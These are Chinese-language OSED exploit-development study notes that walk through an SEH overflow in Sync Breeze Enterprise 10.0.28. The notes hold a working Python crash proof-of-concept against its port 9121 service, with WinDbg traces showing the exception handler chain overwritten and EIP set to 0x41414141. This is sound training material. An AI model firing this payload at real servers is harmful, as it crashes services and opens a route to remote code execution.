---
title: "[OSED, EXP-301] Instructional notes - Part 2"
date: 2026-10-28
author: "CHW"
tags:
  - offsec
description: "OSED EXP-301 筆記 Part 2，整理 SEH Overflow 利用、Structured Exception Handling 機制、TEB 與 _EXCEPTION_REGISTRATION_RECORD、SafeSEH 與 SEHOP、KiUserExceptionDispatcher 與 RtlDispatchException、以 narly 定位未啟用 SafeSEH 的模組、POP POP RET 與 NSEH/SEH 覆寫、short jump 與 Island-Hopping、add sp 與 jmp esp 重導執行流程、msfvenom Meterpreter payload 取得 SYSTEM shell，以及 IDA Pro 反組譯介面、Graph/Text/Proximity view、Search 與 Cross-Reference、與 WinDbg 的 Static-Dynamic 同步（Rebase program）、追蹤 Notepad 的 CreateFileW 與 ReadFile 等等。"
---

[OSED, EXP-301] Instructional notes - Part 2
===

# Table of Contents
[TOC]

# [Link back to: "[OSED, EXP-301] Instructional notes - Part 1"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-1/)
>[!Caution]
> 接續 [[OSED, EXP-301] Instructional notes - Part 1](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-1/) 內容

# Exploiting SEH Overflows
SEH Overflow（Structured Exception Handler Overflow，結構化例外處理器溢位）
前述章節主要讓 EIP 跳到 JMP ESP，再執行 Shellcode\
SEH Overflows 將利用 Windows 的例外處理機制，間接取得對 EIP 的控制

SEH Overflow 的思路不同：
- 不一定能直接覆寫返回位址
- 透過緩衝區溢位破壞例外處理相關的資料結構
- 當程式發生例外時，Windows 會進行例外處理流程
- 如果例外處理鏈中的控制資料遭到適當覆寫，可能讓執行流程被重新導向

## Installing the Sync Breeze Application
利用 Sync Breeze version 10.0.28 作為環境範例\
(前一章 Buffer overflow 使用的是 Sync Breeze 10.0.28)

Options → Server\
![image](https://hackmd.io/_uploads/BJAKhWLhfx.png)

查看 Server Control Port: 預設 9121/TCP
![image](https://hackmd.io/_uploads/Sk2jnbL3fl.png)

![image](https://hackmd.io/_uploads/Sy32nWLhfg.png)

可使用 services.msc 重新啟動 Sync Breeze Enterprise 服務

## Crashing Sync Breeze
先確認漏洞確實存在，利用已公開 [PoC](https://www.exploit-db.com/exploits/44481) \
![image](https://hackmd.io/_uploads/BygI6-I2Ml.png)
```python
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"\x41" * size

  header =  b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer 

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```
![image](https://hackmd.io/_uploads/HJsAYyc2zg.png)

Debugger output:
```dbg
(17f8.1984): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
eax=41414141 ebx=0192fa1c ecx=0192ff18 edx=0192f9d4 esi=0192ff18 edi=0192fb20
eip=00882a9d esp=0192f9a8 ebp=0192fec8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
libpal!SCA_ConfigObj::Deserialize+0x1d:
00882a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????
```
> `EAX = 41414141`, `EIP = 00882A9D`\
> 0x41414141 表示程式原本預期 EAX 裡面有一個有效的指標，但現在它已被測試資料覆寫\
> - `call dword ptr [eax+24h]`
>    - call：呼叫另一個函式或跳至指定的執行位置，同時保存返回位置
>    - dword ptr：將目標視為 4 bytes 的資料
>    - `[eax+24h]`：讀取記憶體中位於 EAX + 0x24 的 4-byte 值
>
> 0x41414141 + 0x24 = 0x41414165\
> 0x41414165 不是這個程序中有效的可讀取記憶體位址，因此發生 Access Violation

### Analyzing the Crash in WinDbg
第一次 Access Violation 發生時，EIP 沒有被直接覆寫；但繼續執行例外處理流程後，EIP 卻變成了 0x41414141

執行 `call dword ptr [eax+24h]`會觸發存取衝突
```dbg
(17f8.1984): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
eax=41414141 ebx=0192fa1c ecx=0192ff18 edx=0192f9d4 esi=0192ff18 edi=0192fb20
eip=00882a9d esp=0192f9a8 ebp=0192fec8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
libpal!SCA_ConfigObj::Deserialize+0x1d:
00882a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????
```
仔細檢查崩潰時的狀態:
```dbg
0:008> r
eax=41414141 ebx=0192fa1c ecx=0192ff18 edx=0192f9d4 esi=0192ff18 edi=0192fb20
eip=00882a9d esp=0192f9a8 ebp=0192fec8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
libpal!SCA_ConfigObj::Deserialize+0x1d:
00882a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????
```
![image](https://hackmd.io/_uploads/SkDj0ycnze.png)

目前只確認 EAX 被輸入資料影響，🥚 未必已經控制 EIP

使用 dds esp L30 檢查堆疊
- dds：適合顯示 32 位元指標與符號資訊的方式，顯示記憶體內容
- esp：從目前 ESP 所指向的堆疊位置開始
- L30：顯示 0x30 個單位；十六進位的 0x30，也就是 48 個 32 位元值
```dbg
0:008> dds esp L30
0194f9a8  0194fb20
0194f9ac  0194f9bc
0194f9b0  00000000
0194f9b4  0194ff18
0194f9b8  0194fa1c
0194f9bc  00000000
0194f9c0  008666c2 libpal!SCA_NetMessage::Deserialize+0x82
...
0194fa1c  41414141
0194fa20  41414141
0194fa24  41414141
0194fa28  41414141
...
```
讓 process 繼續執行
```dbg
0:008> g
(17f8.1984): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=41414141 edx=770a3b20 esi=00000000 edi=00000000
eip=41414141 esp=0192f438 ebp=0192f458 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
41414141 ??              ???
```
> EIP 變成 0x41414141\
> ![image](https://hackmd.io/_uploads/rJUYLG9hMg.png)\
> ![image](https://hackmd.io/_uploads/rygj8fc2zl.png)

### Introduction to Structured Exception Handling
SEH 的資料結構、WinDbg 指令、例外處理流程，以及 SafeSEH 和 SEHOP 的差異

例外（Exception）是會中斷程式正常執行流程的非預期事件，並分成兩種類型:
- Hardware Exception（硬體例外）
上述的 Sync Breeze 就是一個 🌰：`call dword ptr [eax+24h]`\
當時 `EAX = 0x41414141` CPU 讀取 0x41414141 + 0x24 = 0x41414165 但該位址無法提供有效的讀取內容，於是發生 Access Violation
- Software Exception（軟體例外）
Application 可以在程式碼中，主動對特定錯誤情況產生例外\
一個 function 要求輸入的數值必須大於零
```c
if (value <= 0) {
    // 主動產生例外
}
```

![image](https://hackmd.io/_uploads/rkoH42inMe.png)

>[!Note]
>`__try` &  `__except`:
>Microsoft C/C++ 的 Structured Exception Handling 語法
>```cpp
>__try {
>    // 嘗試執行的程式碼
>}
>__except (/* exception filter */) {
>    // 例外處理程式碼
>}
>```
>- `__try`：指定要執行、並受到例外處理機制保護的程式碼區段
>- `__except`：指定符合例外處理條件時要執行的程式碼
>- `exception filter`：決定這個處理區塊是否要處理目前的例外
>```cpp
>__try {
>    PerformOperation();
>}
>__except (EXCEPTION_EXECUTE_HANDLER) {
>    printf("An exception occurred.\n");
>}
>```
>> 程式編譯之後，`__try` / `__except` 不只是普通的 code block，會利用 Windows 提供的 SEH 機制處理例外

### Understanding SEH
OSED 討論的是 x86（32 位元）SEH，不能直接把以下的堆疊結構與 `FS:[0]` 操作方式套用到 x64

SEH 的例外處理資訊是以 Thread 為單位管理 ([per-thread level](https://web.archive.org/web/20240620035750/http://bytepointer.com/resources/pietrek_crash_course_depths_of_win32_seh.htm))

>[!Important]
>TEB（[Thread Environment Block](https://en.wikipedia.org/wiki/Win32_Thread_Information_Block)）\
>TEB 是 Thread Environment Block（Thread 環境區塊），保存與特定 Thread 相關的資訊。Windows 可以透過 TEB 找到該 Thread 的 SEH 例外處理鏈\
>![image](https://hackmd.io/_uploads/SyXGD3o3fg.png)\
>當發生異常時，作業系統會檢查故障 Thread 的 TEB 結構，並透過[FS](https://en.wikipedia.org/wiki/Win32_Thread_Information_Block#Accessing_the_TIB) CPU register 檢索指向`_EXCEPTION_REGISTRATION_RECORD` 結構 [linked](https://en.wikipedia.org/wiki/Linked_list#:~:text=In%20computer%20science%2C%20a%20linked,which%20together%20represent%20a%20sequence) 的 pointer（ ExceptionList ）

在 WinDbg 中導出 TEB 結構
```dbg
0:006> dt nt!_TEB
ntdll!_TEB
   +0x000 NtTib            : _NT_TIB
   +0x01c EnvironmentPointer : Ptr32 Void
   +0x020 ClientId         : _CLIENT_ID
   +0x028 ActiveRpcHandle  : Ptr32 Void
   +0x02c ThreadLocalStoragePointer : Ptr32 Void
   +0x030 ProcessEnvironmentBlock : Ptr32 _PEB
   +0x034 LastErrorValue   : Uint4B
   +0x038 CountOfOwnedCriticalSections : Uint4B
   +0x03c CsrClientThread  : Ptr32 Void
   +0x040 Win32ThreadInfo  : Ptr32 Void
...
```
> - `dt`：顯示資料型別或結構的定義
> - `nt!`：指定 Windows 核心模組 nt 中的符號
> - `_TEB`：要查看的結構名稱
>> - `NtTib`：一個 nested 的 _NT_TIB 結構
>> - `EnvironmentPointer`：環境相關指標
>> - `ClientId`：與 Thread、 Process 識別資訊相關的結構
>> - `ThreadLocalStoragePointer`：Thread 區域儲存空間相關指標
>> - `ProcessEnvironmentBlock`：指向 PEB
>> - `LastErrorValue`：Thread 相關的 Win32 最後錯誤碼
>>
>> `+0x000 NtTib : _NT_TIB` : SEH 鏈的入口

#### 查看 _NT_TIB 定義
```dbg
0:006> dt _NT_TIB
ntdll!_NT_TIB
   +0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD
   +0x004 StackBase        : Ptr32 Void
   +0x008 StackLimit       : Ptr32 Void
   +0x00c SubSystemTib     : Ptr32 Void
   +0x010 FiberData        : Ptr32 Void
   +0x010 Version          : Uint4B
   +0x014 ArbitraryUserPointer : Ptr32 Void
   +0x018 Self             : Ptr32 _NT_TIB
```
> `+0x000 ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD`:
> - `+0x000`：欄位相對於 _NT_TIB 起始位置的偏移量
> - `ExceptionList`：例外處理鏈的入口指標
> - `Ptr32`：pointer 是 32 位元
> - `_EXCEPTION_REGISTRATION_RECORD`：代表例外處理登記紀錄的結構型別

在 32 位元 Windows 上，FS 段暫存器可以用來存取目前 thread 的 TEB\
`FS:[0]` 表示透過 FS 段暫存器，讀取偏移量為 0 的位置。因為 _NT_TIB 位於 TEB 的開頭，所以在這個傳統 x86 SEH 模型中，`FS:[0]` 可用來取得目前 thread 的 ExceptionList，也是 SEH 鏈的起始指標
```
FS:[0]
   │
   ▼
ExceptionList
   │
   ▼
第一筆 _EXCEPTION_REGISTRATION_RECORD
```

#### 理解 `_EXCEPTION_REGISTRATION_RECORD`
```dbg
0:006> dt _EXCEPTION_REGISTRATION_RECORD
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : Ptr32 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : Ptr32     _EXCEPTION_DISPOSITION 
```
Next：下一筆紀錄的指標 (_EXCEPTION_REGISTRATION_RECORD)\
Handler 指向例外處理常式\
![image](https://hackmd.io/_uploads/SJTBcns2fx.png)

#### 理解 _except_handler 的參數
目前可掌握參數的角色:
- 參數一：ExceptionRecord
保存例外的相關資訊，例如例外 code 與例外發生時的相關資料\
這讓處理函式知道目前要處理的是什麼例外
- 參數二：EstablisherFrame
參數指向正在處理的 _EXCEPTION_REGISTRATION_RECORD 所關聯的堆疊框架。讓處理函式知道目前正在使用哪一筆例外處理登記資訊。
- 參數三：ContextRecord
另一個重要欄位。ContextRecord 指向 CONTEXT 結構，保存例外發生時的處理器狀態，包括暫存器內容
- 參數四：DispatcherContext
提供例外分派過程相關的資訊
```c
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
    IN PEXCEPTION_RECORD ExceptionRecord,  
    IN VOID EstablisherFrame,  
    IN OUT PCONTEXT ContextRecord,  
    IN OUT PDISPATCHER_CONTEXT DispatcherContext  
); 
```
#### 查看 _CONTEXT 結構
```dbg
0:006> dt ntdll!_CONTEXT
   +0x000 ContextFlags     : Uint4B
   +0x004 Dr0              : Uint4B
   +0x008 Dr1              : Uint4B
   +0x00c Dr2              : Uint4B
   +0x010 Dr3              : Uint4B
   +0x014 Dr6              : Uint4B
   +0x018 Dr7              : Uint4B
   +0x01c FloatSave        : _FLOATING_SAVE_AREA
   +0x08c SegGs            : Uint4B
   +0x090 SegFs            : Uint4B
   +0x094 SegEs            : Uint4B
   +0x098 SegDs            : Uint4B
   +0x09c Edi              : Uint4B
   +0x0a0 Esi              : Uint4B
   +0x0a4 Ebx              : Uint4B
   +0x0a8 Edx              : Uint4B
   +0x0ac Ecx              : Uint4B
   +0x0b0 Eax              : Uint4B
   +0x0b4 Ebp              : Uint4B
   +0x0b8 Eip              : Uint4B
   +0x0bc SegCs            : Uint4B
   +0x0c0 EFlags           : Uint4B
   +0x0c4 Esp              : Uint4B
   +0x0c8 SegSs            : Uint4B
   +0x0cc ExtendedRegisters : [512] UChar
```
這裡的偏移量是欄位相對於 _CONTEXT 結構起始位置的偏移量，`+0x0b8 Eip : Uint4B` 表示 Eip 欄位位於 _CONTEXT 結構起始位置加上 0xB8 的位置\
當 Windows 處理例外時，需要保存例外發生時的 CPU 狀態。CONTEXT 結構就是保存這類處理器狀態的重要結構之一

#### 理解 _EXCEPTION_DISPOSITION
```dbg
0:006> dt _EXCEPTION_DISPOSITION
ntdll!_EXCEPTION_DISPOSITION
   ExceptionContinueExecution = 0n0
   ExceptionContinueSearch = 0n1
   ExceptionNestedException = 0n2
   ExceptionCollidedUnwind = 0n3
```
表例外處理常式回報的處理結果
- ExceptionContinueExecution
`ExceptionContinueExecution = 0n0` 例外處理常式認為可以繼續執行
- ExceptionContinueSearch
`ExceptionContinueSearch = 0n1` 目前的處理常式無法處理這個例外，應繼續尋找其他處理常式

工作原理：\
![image](https://hackmd.io/_uploads/Hy9kp3shMx.png)\
![image](https://hackmd.io/_uploads/BylR2hinGg.png)


### SEH Validation
Windows 找到 Handler 指向的位址後，會不會直接呼叫它？

#### 理解 KiUserExceptionDispatcher
[ntdll!KiUserExceptionDispatcher](http://www.nynaeve.net/?p=201) 負責在使用者模式的例外處理流程中分派例外，接著例外分派流程會進入 [RtlDispatchException](https://web.archive.org/web/20220925175622/http://www.codewarrior.cn/ntdoc/winnt/rtl/mips/RtlDispatchException.htm) 取得目前 thread 的 TEB，並透過 ExceptionList 逐筆處理例外處理登記紀錄 

#### Windows 會檢查登記紀錄是否落在 Stack 範圍內
Windows 會檢查例外處理登記紀錄是否位於 TEB 所記錄的 stack 範圍內
回顧 _NT_TIB：
```dbg
+0x004 StackBase  : Ptr32 Void
+0x008 StackLimit : Ptr32 Void
```
> (stack 範圍的上界、下界相關)

在一般的 x86 Windows thread 中，堆疊位址通常朝較小的位址方向成長，所以 StackLimit 通常低於 StackBase

#### 理解 [SafeSEH](https://docs.microsoft.com/en-us/cpp/build/reference/safeseh-image-has-safe-exception-handlers)
RtlDispatchException 在處理 Handler 時，還會透過 [RtlIsValidHandler](https://web.archive.org/web/20210302075707/https://www.optiv.com/explore-optiv-insights/blog/old-meets-new-microsoft-windows-safeseh-incompatibility) 執行額外驗證\
傳統 x86 SEH 的登記紀錄包含 Next, Handler ，若程式中的記憶體錯誤導致堆疊上的 Handler 指標遭到覆寫，例外處理流程可能會讀到被竄改的位址。SafeSEH 的目的，是在符合其適用條件的模組中，限制哪些位址可以作為合法的例外處理常式

[環境範例]\
Windows 8.1 的逆向分析 [pseudo-code](https://hackmag.com/uncategorized/exceptions-for-hardcore-users/) 
```c
BOOL RtlIsValidHandler(Handler) // NT 6.3.9600
  {
        if (/* Handler within the image */) {
            if (DllCharacteristics->IMAGE_DLLCHARACTERISTICS_NO_SEH)
                goto InvalidHandler;
            if (/* The image is .Net assembly, 'ILonly' flag is enabled */)
                goto InvalidHandler;
            if (/* Found 'SafeSEH' table */) {
                if (/* The image is registered in 'LdrpInvertedFunctionTable' (or its cache), or the initialization of the process is not complete */) {
                    if (/* Handler found in 'SafeSEH' table */)
                        return TRUE;
                    else
                        goto InvalidHandler;
                }
            return TRUE;
        } else {
            if (/* 'ExecuteDispatchEnable' and 'ImageDispatchEnable' flags are enabled in 'ExecuteOptions' of the process */)
                return TRUE;
            if (/* Handler is in non-executable area of the memory */) {
                if (ExecuteDispatchEnable) return TRUE;
            }
            else if (ImageDispatchEnable) return TRUE;
        }
        InvalidHandler:
            RtlInvalidHandlerDetected(...);
            return FALSE;
  }
```
RtlIsValidHandler 函數會檢查發生異常的特定模組的DllCharacteristics 。若該模組使用 SafeSEH 編譯，則在執行異常處理程序之前，會將其與安全性異常處理程序表中的條目進行比較。\
若 RtlIsValidHandler 的驗證步驟成功，作業系統將呼叫RtlpExecuteHandlerForException 函數。負責設定對應的參數並呼叫ExecuteHandler

[Structured Exception Handler Overwrite Protection (SEHOP)](https://msrc-blog.microsoft.com/2009/02/02/preventing-the-exploitation-of-structured-exception-handler-seh-overwrites-with-sehop/) 的工作原理是在呼叫 `_EXCEPTION_REGISTRATION_RECORD` 結構之前驗證其 link 的有效性。由於在 SEH overflow 時 `Next` member 會被覆蓋，導致 `_EXCEPTION_REGISTRATION_RECORD` 結構鏈不完整，SEHOP 的緩解措施會阻止已損壞的 `_except_handler` 執行

```
發生例外
    │
    ▼
KiUserExceptionDispatcher
    │
    ▼
RtlDispatchException
    │
    ▼
取得 ExceptionList
    │
    ▼
讀取登記紀錄中的 Handler
    │
    ▼
檢查登記紀錄是否在堆疊範圍內
    │
    ▼
RtlIsValidHandler
    │
    ├── 驗證失敗
    │       └── 拒絕呼叫該 Handler
    │
    └── 驗證通過
            │
            ▼
    RtlpExecuteHandlerForException
            │
            ▼
       呼叫 Handler
```
## Structured Exception Handler Overflows
隨著 Stack Overflow 事件的增多， Microsoft 引進了 [GS](https://docs.microsoft.com/en-us/cpp/build/reference/gs-buffer-security-check?view=msvc-160&viewFallbackFrom=msvc-160) 的 Stack Overflow 緩解機制 ，該機制在現代版本的 Visual Studio 中預設為啟用。簡而言之，當載入使用 /GS flag 編譯的二進位檔案時，系統會初始化一個隨機的 [stack cookie seed](https://www.forrest-orr.net/post/a-modern-exploration-of-windows-memory-corruption-exploits-part-i-stack-overflows) ，並將其儲存在二進位檔案的 .data section 中。當呼叫受 GS 保護的函數時，系統會對 stack cookie seed 和 EBP 暫存器執行 XOR 運算。該運算的結果會在傳回位址之前儲存在堆疊上

>[!Tip]
>/GS 與 SEH Overflow 的關係:\
>若 /GS 能偵測 Stack 被覆寫，為什麼教材還要研究 SEH Overflow？\
> 👉🏻 /GS 並不是所有 Stack 資料損壞的通用防護\
> 主要是在受保護函式的特定位置偵測 Stack Cookie 是否遭到修改\
> 🧠：例外處理流程在受保護函式完成 Cookie 檢查之前，就因為被覆寫的 SEH 結構而改變執行流程，可能影響原本預期的檢查時機

![image](https://hackmd.io/_uploads/rJNR86shzl.png)


先觀察 WinDbg 附加時所在執行緒的 SEH Chain，目的只是了解正常結構長什麼樣子\
[!teb](http://windbg.info/doc/1-common-cmds.html#12_thread) WinDbg Extension Command，用來顯示目前 thread 的 TEB
```dbg
0:007> !teb
TEB at 7ffd8000
    ExceptionList:        0132ff70
    StackBase:            01330000
    StackLimit:           0132c000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 7ffd8000
    EnvironmentPointer:   00000000
    ClientId:             000004d4 . 00000c8c
    RpcHandle:            00000000
    Tls Storage:          00000000
    PEB Address:          7ffd7000
    LastErrorValue:       0
    LastStatusValue:      0
    Count Owned Locks:    0
    HardErrorMode:        0
```
> - `ExceptionList: 0132ff70`: 目前 thread 的 Exception List 起始指標是 0x0132FF70 (x86 SEH 模型中，這個位址指向第一筆 _EXCEPTION_REGISTRATION_RECORD)
> - `StackBase: 01330000` : 目前 Stack 的高位址邊界
> - `StackLimit: 0132c000`: 目前 Stack 的低位址邊界
> ```
> 較高記憶體位址
>0x01330000  ← StackBase
>     │
>     │  SEH Records 位於這附近
>     ▼
>0x0132FF70  ← ExceptionList 指向的位置
>     │
>     ▼
>     ...
>0x0132C000  ← StackLimit
>較低記憶體位址
> ```

使用 dt 查看 _EXCEPTION_REGISTRATION_RECORD
```dbg
0:007> dt _EXCEPTION_REGISTRATION_RECORD 0132ff70
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x0132ffcc _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x7728a380     _EXCEPTION_DISPOSITION  ntdll!_except_handler4+0
   
0:007> dt _EXCEPTION_REGISTRATION_RECORD 0x0132ffcc
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x0132ffe4 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x7728a380     _EXCEPTION_DISPOSITION  ntdll!_except_handler4+0
   
0:007> dt _EXCEPTION_REGISTRATION_RECORD 0x0132ffe4
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0xffffffff _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x77296c7c     _EXCEPTION_DISPOSITION  ntdll!FinalExceptionHandlerPad12+0
```
> - `+0x000 Next`: Next 位於這筆 Record 起始位置的偏移量 0x0 (下一筆 Record 0x0132FFCC)
> - `+0x004 Handler`: Handler 位於結構起始位址加上 0x4 的位置 (WinDbg 辨識為 `ntdll!_except_handler4+0`)
>
>手動沿著 Next 走訪整條 Chain
>```
>第一筆 Record
>位址：0x0132FF70
>├── Next    = 0x0132FFCC
>└── Handler = 0x7728A380
>              ntdll!_except_handler4
>
>             │
>             ▼
>
>第二筆 Record
>位址：0x0132FFCC
>├── Next    = 0x0132FFE4
>└── Handler = 0x7728A380
>              ntdll!_except_handler4
>
>             │
>             ▼
>
>第三筆 Record
>位址：0x0132FFE4
>├── Next    = 0xFFFFFFFF
>└── Handler = 0x77296C7C
>              ntdll!FinalExceptionHandlerPad12
>```

重新執行 PoC，觀察 SEH 被覆寫的情況
```
┌──(chw💲CHW)-[~/Offsec/OSED/StackOverflow]
└─$ python3 seh_overflow_0x01.py 192.168.120.10
Sending evil buffer...
Done!
```
查看 Windbg 停在 Access violation - code c0000005 (first chance)\
**"`c0000005` 是 Windows 常見的 Access Violation Error Code"**
```dbg
(ed8.192c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
eax=41414141 ebx=01c4fa1c ecx=01c4ff18 edx=01c4f9d4 esi=01c4ff18 edi=01c4fb20
eip=00ac2a9d esp=01c4f9a8 ebp=01c4fec8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
libpal!SCA_ConfigObj::Deserialize+0x1d:
00ac2a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????

0:011> !teb
TEB at 0026b000
    ExceptionList:        01c4fe1c
    StackBase:            01c50000
    StackLimit:           01c4f000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 0026b000
    EnvironmentPointer:   00000000
    ClientId:             00000ed8 . 0000192c
    RpcHandle:            00000000
    Tls Storage:          0054fa80
    PEB Address:          0025d000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0

0:011> dt _EXCEPTION_REGISTRATION_RECORD 01c4fe1c
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x01c4ff54 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x00b3df5b     _EXCEPTION_DISPOSITION  libpal!md5_starts+0

0:011> dt _EXCEPTION_REGISTRATION_RECORD 0x01c4ff54
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x41414141 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x41414141     _EXCEPTION_DISPOSITION  +41414141
```
> - `eax=41414141 eip=00ac2a9d`: EAX 已經被輸入資料覆寫成 AAAA，但此時 EIP 仍指向 `libpal!SCA_ConfigObj::Deserialize+0x1d`
>
> - 重新查看 TEB:\
> 第一筆 SEH Record 的位址變成 `0x01C4FE1C`
> - 查看第一筆 Record: (01c4fe1c)\
> Next 指向 `0x01C4FF54`
> - 查看第二筆 Record: (0x01c4ff54)\ 
> `Next    : 0x41414141` `Handler : 0x41414141`\
> 原本 Next 和 Handler 應該保存有效的結構位址或函式位址都被竄改\
> 👉🏻 輸入資料已經覆寫這筆 SEH Record

#### 使用 !exchain 快速查看 SEH Chain
WinDbg 提供更方便的指令 [!exchain](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-exchain) 會列出目前執行緒的 SEH Handler Chain
```dbg
0:011> !exchain
01c4fe1c: libpal!md5_starts+149fb (00b3df5b)
01c4ff54: 41414141
Invalid exception stack at 41414141
```
> - `01c4fe1c libpal!md5_starts+149fb (00b3df5b)`:表示第一筆 Record 位於 0x01C4FE1C，其 Handler 位址是 0x00B3DF5B
> - `01c4ff54: 41414141`: 第二筆 Record 位於 0x01C4FF54，其 Handler 已經被覆寫成 0x41414141
> - `Invalid exception stack at 41414141`: WinDbg 嘗試繼續檢查 Chain 時，發現後續結構指標不合理

與手動導出的 SEH Chain 資訊相同

在 WinDbg 中恢復執行
```dbg
0:011> g
(ed8.192c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=41414141 edx=77383b20 esi=00000000 edi=00000000
eip=41414141 esp=01c4f438 ebp=01c4f458 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
41414141 ??              ???

0:011> k
 # ChildEBP RetAddr  
WARNING: Frame IP not in any known module. Following frames may be wrong.
00 01c4f434 77383b02 0x41414141
01 01c4f458 77383ad4 ntdll!ExecuteHandler2+0x26
02 01c4f528 77371586 ntdll!ExecuteHandler+0x24
03 01c4f528 00ac2a9d ntdll!KiUserExceptionDispatcher+0x26
04 01c4fec8 00000000 libpal!SCA_ConfigObj::Deserialize+0x1d
```
>[!Tip]
>  為什麼 g 之後 EIP 才變成 0x41414141 ?!\
> ![image](https://hackmd.io/_uploads/HyIRfKhnfx.png)\
> Windows 在處理例外時，會沿著目前 thread 的 SEH Chain 尋找適當的 Handler。第一筆 Record 還是有效的，因此例外處理流程可以先使用第一筆 Record。當流程繼續處理第二筆 Record 時，就會遇到被覆寫的 Handler。\
> 👉🏻 CPU 最終嘗試呼叫 0x41414141，所以 EIP 變成 0x41414141

#### 使用 Call Stack 追蹤 EIP 被控制前的函式
k 查看 Call Stack
```dbg
0:011> k
 # ChildEBP RetAddr  
WARNING: Frame IP not in any known module. Following frames may be wrong.
00 01c4f434 77383b02 0x41414141
01 01c4f458 77383ad4 ntdll!ExecuteHandler2+0x26
02 01c4f528 77371586 ntdll!ExecuteHandler+0x24
03 01c4f528 00ac2a9d ntdll!KiUserExceptionDispatcher+0x26
04 01c4fec8 00000000 libpal!SCA_ConfigObj::Deserialize+0x1d
```
> Call Stack 顯示:
> ```
> libpal!SCA_ConfigObj::Deserialize
>    ↓
>ntdll!KiUserExceptionDispatcher
>    ↓
>ntdll!ExecuteHandler
>    ↓
>ntdll!ExecuteHandler2
>    ↓
>0x41414141
> ```
> - KiUserExceptionDispatcher\
Windows user-mode 例外處理流程中的重要部分，負責將相關例外狀態交給 user-mode 的例外分派機制處理。
> - ExecuteHandler\
透過這個函式追蹤例外處理流程
> - ExecuteHandler2
下一步要觀察的重點，ExecuteHandler2 會呼叫 Stack 上註冊的 Handler，用於追蹤控制流程如何抵達被覆寫 Handler 的重要位置


使用 r 查看暫存器
```dbg
0:011> r
eax=00000000 ebx=00000000 ecx=41414141 edx=77383b20 esi=00000000 edi=00000000
eip=41414141 esp=01c4f438 ebp=01c4f458 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
41414141 ??              ???

0:011> dds esp La
01c4f438  77383b02 ntdll!ExecuteHandler2+0x26
01c4f43c  01c4f540
01c4f440  01c4ff54
01c4f444  01c4f55c
01c4f448  01c4f4cc
01c4f44c  01c4fe1c
01c4f450  77383b20 ntdll!ExecuteHandler2+0x44
01c4f454  01c4ff54
01c4f458  01c4f528
01c4f45c  77383ad4 ntdll!ExecuteHandler+0x24

0:011> u edx
ntdll!ExecuteHandler2+0x44:
77383b20 8b4c2404        mov     ecx,dword ptr [esp+4]
77383b24 f7410406000000  test    dword ptr [ecx+4],6
77383b2b b801000000      mov     eax,1
77383b30 7512            jne     ntdll!ExecuteHandler2+0x68 (77383b44)
